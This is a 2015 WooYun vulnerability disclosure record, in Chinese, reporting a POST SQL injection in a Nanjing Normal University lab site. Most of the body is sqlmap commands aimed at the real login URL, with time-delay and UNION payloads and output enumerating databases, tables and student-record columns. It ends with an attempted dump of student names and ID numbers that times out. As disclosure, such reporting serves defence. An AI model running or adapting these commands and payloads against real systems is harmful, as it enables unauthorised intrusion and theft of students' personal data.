{"id": 24496, "wybug_id": "wooyun-2015-0141144", "wybug_title": "南京师范大学某分站存在sql注入漏洞", "wybug_corp": "CCERT教育网应急响应组", "wybug_author": "0error-0warning", "wybug_date": "2015-09-15 09:17", "wybug_open_date": "2015-09-20 09:18", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 存在post注入漏洞，注入后，可能被利用。 详细说明：  \nhttp://lab.njnu.edu.cn/huaxue/default.asp\n\n\n通过Firefox拿到post提交的参数\n\n开始了\nD:\\Python27\\sqlmap>sqlmap.py -u \"http://lab.njnu.edu.cn/checkuser.asp\" --data \"collagename=admin&collagepass=admin\" --batch         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150913}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.orgsqlmap resumed the following injection point(s) from stored session:---Parameter: collagename (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: collagename=admin';WAITFOR DELAY '0:0:5'--&collagepass=admin    Type: UNION query    Title: Generic UNION query (NULL) - 16 columns    Payload: collagename=-2081' UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(115)+CHAR(108)+CHAR(101)+CHAR(106)+CHAR(68)+CHAR(75)+CHAR(79)+CHAR(113)+CHAR(100)+CHAR(117)+CHAR(113)+CHAR(120)+CHAR(112)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--&collagepass=admin---[17:27:10] [INFO] testing Microsoft SQL Server[17:27:11] [INFO] confirming Microsoft SQL Server[17:27:15] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000\n拿数据库\nD:\\Python27\\sqlmap>sqlmap.py -u \"http://lab.njnu.edu.cn/checkuser.asp\" --data \"collagename=admin&collagepass=admin\" --dbs  --batch         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150913}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.orgavailable databases [43]:[*] BZBB_lw[*] ChuangXinNS[*] db_dike[*] db_njsdjw[*] db_njsfsy[*] db_nsddlhj[*] db_nsdhgxn[*] db_nsdmba[*] db_nsdMediaC[*] db_nsdscw[*] db_nsdsw[*] db_nsdswyy[*] db_nsdswzy[*] db_sdjxjy[*] db_spaqjc[*] JiaoCai[*] master[*] MBA[*] model[*] msdb[*] njnulab[*] njnupj[*] nju2222[*] njuold[*] njupj2012[*] Northwind[*] NSD_ApplicationChemical[*] NSD_Cnooc[*] NSD_ElectricalEngineering[*] NSD_ElectronicInformation[*] NSD_LogisticsServices[*] NSD_TeacherSkills[*] NSD_TeachingTeam[*] nsddky_sy[*] nsdsfjdzxnew[*] nsglxt[*] NSHuaKe[*] NSXinLiXue[*] NY_JG[*] pubs[*] ShangXueYuannew[*] tempdb[*] zhongxinold\n一看又是这么多数据库，找一个试试运气\nD:\\Python27\\sqlmap>sqlmap.py -u \"http://lab.njnu.edu.cn/checkuser.asp\" --data \"collagename=admin&collagepass=admin\" -D nsglxt --tables --batch         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150913}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.orgDatabase: nsglxt[82 tables]+-------------------+| bigxkname         || book              || cg                || collagemanage     || collagename       || config            || csh               || dgjc              || dgmd              || dgzy              || dike_BigClass     || dike_News         || dike_SmallClass   || dike_down         || dike_gg           || dike_links        || dike_sqb          || dike_szdw         || dtproperties      || faxue_BigClass    || faxue_News        || faxue_SmallClass  || faxue_down        || faxue_gg          || faxue_links       || faxue_sqb         || faxue_szdw        || fjjg1             || fjjg1             || gg2               || gg2               || gz                || huaxue_BigClass   || huaxue_News       || huaxue_SmallClass || huaxue_down       || huaxue_gg         || huaxue_links      || huaxue_sqb        || huaxue_szdw       || jf                || jgcg              || jxjh              || kbxm              || new               || qunfa             || ryzk              || rz                || sb                || school            || score             || smallxkname       || special           || student           || sysb              || sysconstraints    || syssegments       || sytable           || syyq              || tu                || urll              || user              || xinli_BigClass    || xinli_News        || xinli_SmallClass  || xinli_Vote        || xinli_down        || xinli_gg          || xinli_links       || xinli_sqb         || xinli_szdw        || xk1               || xk2               || xkname            || xm                || xmsq2             || xmsq2             || xueji             || yijian            || yuxi              || zxname            || zyname            |+-------------------+\n又是这么多表，再选一个\nD:\\Python27\\sqlmap>sqlmap.py -u \"http://lab.njnu.edu.cn/checkuser.asp\" --data \"collagename=admin&collagepass=admin\" -D nsglxt -T student --columns --batch         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150913}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.orgDatabase: nsglxtTable: student[10 columns]+--------+----------+| Column | Type     |+--------+----------+| BJDM   | nvarchar || BJMC   | nvarchar || CJF    | nvarchar || MM     | nvarchar || NJ     | nvarchar || XB     | nvarchar || XH     | nvarchar || XM     | nvarchar || YX     | nvarchar || ZY     | nvarchar |+--------+----------+\n后面再破解列的时候就变成going to retry the request，不知道是不是选错数据库和表了\nD:\\Python27\\sqlmap>sqlmap.py -u \"http://lab.njnu.edu.cn/checkuser.asp\" --data \"collagename=admin&collagepass=admin\" -D nsglxt -T student -C \"XM,XB,XH\" --dump --batch         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150913}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[18:06:27] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request\n这个问题还是留给大牛们吧。   漏洞证明：  也不想重新试其他数据库了，就此收工。   修复方案：     版权声明：转载请注明来源 0error-0warning@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-20 09:18 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}